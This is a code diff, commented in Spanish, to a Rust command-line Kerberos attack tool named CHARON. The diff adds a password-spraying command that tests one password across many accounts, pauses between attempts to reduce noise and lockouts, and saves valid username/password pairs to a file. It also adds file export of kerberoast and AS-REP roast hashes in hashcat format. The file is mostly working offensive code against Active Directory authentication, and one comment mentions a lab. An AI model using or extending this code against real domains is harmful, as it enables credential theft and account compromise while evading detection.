@@ -1,7 +1,7 @@
 //! CHARON — el barquero que transporta mensajes entre cliente y KDC
 //! y te muestra todo lo que cruza el río.
 
-use std::io::Write as _;
+use std::io::{BufRead as _, Write as _};
 use std::process::ExitCode;
 
 use clap::{Parser, Subcommand, ValueEnum};
@@ -68,8 +68,12 @@ enum Command {
         spn: Vec<String>,
         #[arg(short, long)]
         user: String,
+        /// Contraseña del usuario (o --password-stdin; env: CHARON_PASSWORD).
         #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
-        password: String,
+        password: Option<String>,
+        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
+        #[arg(long)]
+        password_stdin: bool,
         #[arg(short, long)]
         realm: String,
         /// Salt AES del usuario (si no lo conoces, Charon lo aprende del error 25).
@@ -84,6 +88,37 @@ enum Command {
         port: u16,
         #[arg(long)]
         json: bool,
+        /// Escribe los hashes hashcat a este fichero además de imprimirlos.
+        #[arg(long)]
+        output: Option<String>,
+    },
+    /// Password spraying: una contraseña candidata contra muchos usuarios
+    /// con el flujo AS completo (clasifica 6/24/éxito y aprende el salt
+    /// de cada usuario del error 25 antes de probar).
+    Spray {
+        /// Usuarios a probar, separados por coma o ruta a fichero (@fichero).
+        #[arg(short, long, value_delimiter = ',')]
+        users: Vec<String>,
+        /// Contraseña candidata (o --password-stdin; env: CHARON_PASSWORD).
+        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
+        password: Option<String>,
+        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
+        #[arg(long)]
+        password_stdin: bool,
+        #[arg(short, long)]
+        realm: String,
+        #[arg(long, default_value = "127.0.0.1")]
+        dc: String,
+        #[arg(long, default_value_t = 88)]
+        port: u16,
+        /// Pausa entre intentos en ms (OPSEC: menos ruido y menos lockouts).
+        #[arg(long, default_value_t = 0)]
+        delay_ms: u64,
+        #[arg(long)]
+        json: bool,
+        /// Fichero donde dejar los aciertos (usuario<TAB>contraseña).
+        #[arg(long)]
+        output: Option<String>,
     },
     /// AS-REP roasting: cuentas con DONT_REQUIRE_PREAUTH.
     Asreproast {
@@ -97,6 +132,9 @@ enum Command {
         port: u16,
         #[arg(long)]
         json: bool,
+        /// Escribe los hashes hashcat a este fichero además de imprimirlos.
+        #[arg(long)]
+        output: Option<String>,
     },
     /// Pass-the-key: autentica con NT hash o clave AES sin la contraseña.
     Passthekey {
@@ -122,8 +160,12 @@ enum Command {
     As {
         #[arg(short, long)]
         user: String,
+        /// Contraseña (o --password-stdin; env: CHARON_PASSWORD).
         #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
-        password: String,
+        password: Option<String>,
+        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
+        #[arg(long)]
+        password_stdin: bool,
         #[arg(short, long)]
         realm: String,
         /// Salt AES (por defecto: realm + cname, la construcción estándar).
@@ -144,6 +186,9 @@ enum Command {
         /// Clave para descifrar el enc-part (contraseña: salt = realm+user).
         #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
         password: Option<String>,
+        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
+        #[arg(long)]
+        password_stdin: bool,
         /// Alternativa: NT hash para etype 23.
         #[arg(long)]
         nt_hash: Option<String>,
@@ -270,10 +315,11 @@ fn run(cli: Cli) -> Result<(), String> {
             Ok(())
         }
 
-        Command::Kerberoast { spn, user, password, realm, salt, etype, dc, port, json } => {
+        Command::Kerberoast { spn, user, password, password_stdin, realm, salt, etype, dc, port, json, output } => {
             if spn.is_empty() {
                 return fail("--spn vacío".into());
             }
+            let password = resolve_password(password, password_stdin)?;
             let c = conn(&dc, port);
             // 1) aprender el salt si no viene: AS-REQ sin preauth del usuario.
             let salt = match salt {
@@ -292,9 +338,11 @@ fn run(cli: Cli) -> Result<(), String> {
                 v
             };
             let mut out = Vec::new();
+            let mut hashes = Vec::new();
             for s in &spn {
                 let r = charon_attacks::kerberoast(&c, &tgt, s, &etypes, charon_krb5::kdc_options::CANONICALIZE)
                     .map_err(|e| e.to_string())?;
+                hashes.push(r.hashcat.clone());
                 if json {
                     out.push(serde_json::json!({
                         "spn": r.spn, "account": r.account, "realm": r.realm,
@@ -313,19 +361,24 @@ fn run(cli: Cli) -> Result<(), String> {
             if json {
                 println!("{}", serde_json::to_string_pretty(&out).map_err(|e| e.to_string())?);
             }
+            if let Some(path) = &output {
+                write_output(path, &hashes)?;
+            }
             Ok(())
         }
 
-        Command::Asreproast { users, realm, dc, port, json } => {
+        Command::Asreproast { users, realm, dc, port, json, output } => {
             let list = resolve_users(&users)?;
             let c = conn(&dc, port);
             let etypes = [etype_mod::AES256_CTS_HMAC_SHA1_96, etype_mod::AES128_CTS_HMAC_SHA1_96, etype_mod::RC4_HMAC];
             let mut any = false;
+            let mut hashes = Vec::new();
             for u in &list {
                 let r = charon_attacks::asreproast(&c, u, &realm, &etypes).map_err(|e| e.to_string())?;
                 match r {
                     Some(rep) => {
                         any = true;
+                        hashes.push(rep.hashcat.clone());
                         if !json {
                             println!(
                                 "\n{} {} → cuenta sin preauth, ticket en {}",
@@ -349,6 +402,61 @@ fn run(cli: Cli) -> Result<(), String> {
                 println!("[]");
             }
             let _ = any;
+            if let Some(path) = &output {
+                write_output(path, &hashes)?;
+            }
+            Ok(())
+        }
+
+        Command::Spray { users, password, password_stdin, realm, dc, port, delay_ms, json, output } => {
+            let list = resolve_users(&users)?;
+            if list.is_empty() {
+                return fail("--users vacío: pasa usuarios separados por coma o @fichero".into());
+            }
+            let password = resolve_password(password, password_stdin)?;
+            let c = conn(&dc, port);
+            let etypes = [etype_mod::AES256_CTS_HMAC_SHA1_96, etype_mod::AES128_CTS_HMAC_SHA1_96];
+            let mut hits = Vec::new();
+            let mut rows = Vec::new();
+            for (i, u) in list.iter().enumerate() {
+                if i > 0 && delay_ms > 0 {
+                    std::thread::sleep(std::time::Duration::from_millis(delay_ms));
+                }
+                match charon_attacks::spray_password(&c, u, &realm, &password, &etypes) {
+                    Ok(att) => {
+                        if att.result.valid() {
+                            hits.push(format!("{u}\t{password}"));
+                        }
+                        if !json {
+                            print_spray(&att);
+                        }
+                        rows.push(serde_json::json!({
+                            "user": att.user,
+                            "result": format!("{:?}", att.result),
+                        }));
+                    }
+                    Err(e) => {
+                        if !json {
+                            println!("{} {}: fallo de protocolo: {e}", "✗".red().bold(), u.cyan());
+                        }
+                        rows.push(serde_json::json!({"user": u, "error": e}));
+                    }
+                }
+            }
+            if json {
+                println!("{}", serde_json::to_string_pretty(&rows).map_err(|e| e.to_string())?);
+            } else {
+                println!(
+                    "\n{} {} credenciales válidas de {} usuarios probados contra {}",
+                    "resumen:".bold(),
+                    hits.len().to_string().cyan(),
+                    list.len(),
+                    dc.bold()
+                );
+            }
+            if let Some(path) = &output {
+                write_output(path, &hits)?;
+            }
             Ok(())
         }
 
@@ -393,8 +501,9 @@ fn run(cli: Cli) -> Result<(), String> {
             Ok(())
         }
 
-        Command::As { user, password, realm, salt, etype, dc, port } => {
+        Command::As { user, password, password_stdin, realm, salt, etype, dc, port } => {
             let c = conn(&dc, port);
+            let password = resolve_password(password, password_stdin)?;
             let salt = match salt {
                 Some(s) => s,
                 None => learn_salt(&c, &user, &realm)?,
@@ -415,8 +524,9 @@ fn run(cli: Cli) -> Result<(), String> {
             Ok(())
         }
 
-        Command::Decode { file, password, nt_hash, realm, user, usage, json } => {
+        Command::Decode { file, password, password_stdin, nt_hash, realm, user, usage, json } => {
             let bytes = std::fs::read(&file).map_err(|e| format!("no pude leer {file}: {e}"))?;
+            let password = if password_stdin { Some(resolve_password(password, true)?) } else { password };
             let key = if let Some(h) = &nt_hash {
                 let b = decode_hex(h)?;
                 Some(KerberosKey::from_raw(etype_mod::RC4_HMAC, &b).map_err(|e| e.to_string())?)
@@ -546,6 +656,63 @@ fn resolve_users(input: &[String]) -> Result<Vec<String>, String> {
         }
     }
     Ok(out)
+}
+
+/// Contraseña desde argv/env o desde stdin (`--password-stdin`): la vía
+/// stdin evita que el secreto quede visible en `ps` y en el history del
+/// shell. argv se mantiene por comodidad en el lab.
+fn resolve_password(password: Option<String>, stdin: bool) -> Result<String, String> {
+    if stdin {
+        let mut buf = String::new();
+        std::io::stdin()
+            .lock()
+            .read_line(&mut buf)
+            .map_err(|e| format!("no pude leer la contraseña de stdin: {e}"))?;
+        let pw = buf.trim_end_matches(['\r', '\n']).to_string();
+        if pw.is_empty() {
+            return Err("stdin cerrado o contraseña vacía".into());
+        }
+        return Ok(pw);
+    }
+    password.ok_or_else(|| {
+        "falta la contraseña: usa -p/--password, la env CHARON_PASSWORD o --password-stdin".into()
+    })
+}
+
+/// Vuelca líneas (hashes hashcat, aciertos de spray) a un fichero.
+fn write_output(path: &str, lines: &[String]) -> Result<(), String> {
+    std::fs::write(path, lines.join("\n") + if lines.is_empty() { "" } else { "\n" })
+        .map_err(|e| format!("no pude escribir {path}: {e}"))?;
+    eprintln!(
+        "{} {} líneas escritas en {}",
+        "escrito:".dimmed(),
+        lines.len(),
+        path.cyan()
+    );
+    Ok(())
+}
+
+/// Imprime el resultado de un intento de spray con el mismo lenguaje
+/// visual que enum/kerberoast.
+fn print_spray(a: &charon_attacks::SprayAttempt) {
+    use charon_attacks::SprayResult as SR;
+    match &a.result {
+        SR::Valid => {
+            println!("{} {} — CONTRASEÑA VÁLIDA (TGT obtenido)", "✓".green().bold(), a.user.cyan())
+        }
+        SR::WrongPassword => {
+            println!("{} {} — incorrecta (el usuario existe, preauth fallido)", "✗".red().bold(), a.user.cyan())
+        }
+        SR::UnknownUser => println!("{} {} — inexistente", "✗".dimmed(), a.user.cyan()),
+        SR::NoPreauth => println!(
+            "{} {} — sin preauth: la contraseña no interviene (AS-REP roasteable)",
+            "!".yellow().bold(),
+            a.user.cyan()
+        ),
+        SR::KdcError { code, detail } => {
+            println!("{} {} — error KDC {code} {detail}", "!".yellow().bold(), a.user.cyan())
+        }
+    }
 }
 
 /// Aprende el salt del usuario con un AS-REQ sin preauth: el error 25 del
